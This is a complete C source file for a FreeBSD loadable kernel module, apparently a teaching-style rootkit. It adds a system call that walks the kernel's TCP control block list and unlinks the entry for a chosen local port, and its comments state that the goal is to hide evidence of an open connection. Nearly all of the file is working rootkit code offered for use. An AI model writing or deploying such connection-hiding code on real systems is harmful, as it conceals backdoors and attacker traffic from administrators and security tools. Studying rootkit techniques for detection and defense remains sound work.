// This code will remove the evidence of an open tcp connection
// by removing the control block from the list of active connections.
//Every open socket will have an associated inpcb control block 
// structure which will contain meta-data such as networking addresses
// port nos, etc.
// 
// All of these inpcb structs are placed into a list of such blocks
// and that is placed inside a struct called inpcbinfo.
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/sysproto.h>


#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

// The single argument to this system call is the port that
// needs to be hidden. But this can be changed to have a port
// and additional parameters so that more granular hiding can be
// done. 
struct port_hiding_args {
	u_int16_t lport;
}; 

static int port_hiding(struct thread *td, void * syscall_args) {
	
	struct port_hiding_args * uap;

	uap = (struct port_hiding_args *)syscall_args;

	struct inpcb * inpb;

// tcbinfo is the struct that contains the list head for the
// list of tcp control blocks. That list head is in 
// ipi_listhead. 

	INP_INFO_WLOCK(&tcbinfo); 

	LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
		if (inpb->inp_vflag & INP_TIMEWAIT) {
			continue;
		}
// Once the correct control block is obtained - meaning something
// that is not in wait mode. When the socket is about to be closed
// the connection is in the WAIT STATE. The vflag is the version
// flag, but it is overloaded, and that is why the above AND
// will work. 

		INP_RLOCK(inpb);

// Here below we do the compare of the input port with the port number
// in the inpb struct. If there is a match we knock it off the list.

		if (uap->lport == htons(inpb->inp_inc.inc_ie.ie_lport)) {
			LIST_REMOVE(inpb, inp_list);
		}

		INP_RUNLOCK(inpb);
	}

	INP_INFO_WUNLOCK(&tcbinfo);

	return(0); 
}

static struct sysent port_hiding_sysent = {
	1,
	port_hiding
};

static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void * args) {
	int error = 0;

	switch(cmd) {
		case MOD_LOAD:
			uprintf("System call loaded at offset %d\n", offset);
			break;
		case MOD_UNLOAD:
			uprintf("System call unloaded from offset %d\n", offset);
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);
